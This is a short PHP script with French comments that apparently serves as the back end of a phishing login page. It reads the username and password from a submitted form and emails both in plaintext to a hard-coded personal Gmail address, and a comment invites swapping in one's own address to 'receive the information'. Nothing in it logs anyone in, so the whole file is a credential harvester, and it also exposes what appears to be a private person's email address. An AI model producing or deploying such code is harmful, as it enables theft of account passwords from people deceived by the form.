<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les données du formulaire
    $username = htmlspecialchars($_POST['username']);  // Utilisation de htmlspecialchars pour éviter les failles XSS
    $password = htmlspecialchars($_POST['password']);

    // L'adresse email du destinataire
    $to = "martinlouail2008@gmail.com";  // Remplacez avec l'adresse email où vous souhaitez recevoir les informations

    // Sujet de l'email
    $subject = "Connexion : Informations de l'utilisateur";

    // Corps de l'email
    $message = "
        <html>
        <head>
            <title>Informations de connexion</title>
        </head>
        <body>
            <h2>Nom d'utilisateur : $username</h2>
            <p><strong>Mot de passe :</strong> $password</p>
        </body>
        </html>
    ";

    // Pour envoyer un email au format HTML, il faut spécifier les en-têtes appropriés
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8" . "\r\n";
    $headers .= "From: webmaster@votresite.com" . "\r\n"; // Vous pouvez définir une adresse email d'expéditeur

    // Envoi de l'email
    if (mail($to, $subject, $message, $headers)) {
        echo "L'email a été envoyé avec succès.";
    } else {
        echo "Il y a eu une erreur lors de l'envoi de l'email.";
    }
}
?>